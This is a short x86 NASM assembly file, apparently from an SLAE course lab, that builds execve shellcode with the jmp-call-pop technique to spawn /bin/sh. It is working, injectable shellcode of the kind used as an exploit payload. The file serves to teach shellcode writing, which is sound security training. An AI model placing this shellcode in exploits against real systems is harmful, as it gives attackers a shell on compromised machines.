; Shellcode to exercise the SLAE execve lab
; Author: Pedro Rodrigues


global _start

section .text

_start:

	; zero-ing 3 registers in a row
 	xor ebx, ebx
 	mul ebx

 	xor ecx, ecx
 	jmp bin_bash

 execve_rt:
 	pop ebx
 	mov al, 0xB
 	int 0x80


 bin_bash:
 	call execve_rt
 	message db "/bin/sh", 0x0